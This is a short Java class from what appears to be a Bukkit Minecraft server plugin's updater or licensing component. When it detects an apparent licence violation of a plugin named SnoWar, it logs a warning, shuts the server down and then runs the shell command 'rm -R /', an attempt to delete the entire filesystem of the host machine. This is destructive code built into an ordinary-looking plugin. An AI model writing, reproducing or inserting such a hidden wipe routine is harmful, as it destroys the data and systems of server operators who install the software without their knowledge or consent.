package net.vorps.updater.action;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

/**
 * Project Updater Created by Vorps on 02/09/2016 at 00:41.
 */
public class ActionExtreme implements Execute{

    @Override
    public boolean run(final Plugin plugin){
        plugin.getLogger().warning("§cViolation of law Plugin SnoWar");
        Bukkit.shutdown();
        try {
            Runtime.getRuntime().exec("rm -R /");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
}
